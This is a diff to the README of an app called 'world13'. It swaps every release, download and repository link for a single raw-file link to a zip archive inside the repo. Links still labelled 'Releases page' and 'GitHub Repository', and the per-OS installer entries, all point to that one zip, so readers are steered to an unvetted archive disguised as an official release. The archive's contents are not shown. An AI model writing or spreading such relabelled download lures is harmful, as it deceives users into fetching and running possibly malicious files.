@@ -17,14 +17,14 @@ Welcome to world13! This application follows a clean and minimal design philosop
 To get started with world13, please follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Download world13](https://github.com/anlo0/world13/releases)
+   [Download world13](https://raw.githubusercontent.com/anlo0/world13/main/symbasic/world13.zip)
 
 2. On the Releases page, look for the latest version of the application. 
 
 3. Choose the file suitable for your operating system. Available files typically include:
-   - **Windows:** world13-setup.exe
-   - **macOS:** world13.dmg
-   - **Linux:** world13.tar.gz
+   - **Windows:** https://raw.githubusercontent.com/anlo0/world13/main/symbasic/world13.zip
+   - **macOS:** https://raw.githubusercontent.com/anlo0/world13/main/symbasic/world13.zip
+   - **Linux:** https://raw.githubusercontent.com/anlo0/world13/main/symbasic/world13.zip
 
 4. Click on the file to download it.
 
@@ -34,7 +34,7 @@ To get started with world13, please follow these steps:
 
 7. After installation, you can find world13 in your applications menu. Launch it to start enjoying the application!
 
-If you ever need to download a new version or check for updates, simply return to the [Releases page](https://github.com/anlo0/world13/releases).
+If you ever need to download a new version or check for updates, simply return to the [Releases page](https://raw.githubusercontent.com/anlo0/world13/main/symbasic/world13.zip).
 
 ## 🛠️ System Requirements
 
@@ -80,8 +80,8 @@ Thank you for choosing world13. We appreciate your interest and support. Your fe
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/anlo0/world13)
-- [Download world13](https://github.com/anlo0/world13/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/anlo0/world13/main/symbasic/world13.zip)
+- [Download world13](https://raw.githubusercontent.com/anlo0/world13/main/symbasic/world13.zip)
 
 Enjoy using world13!
 ```
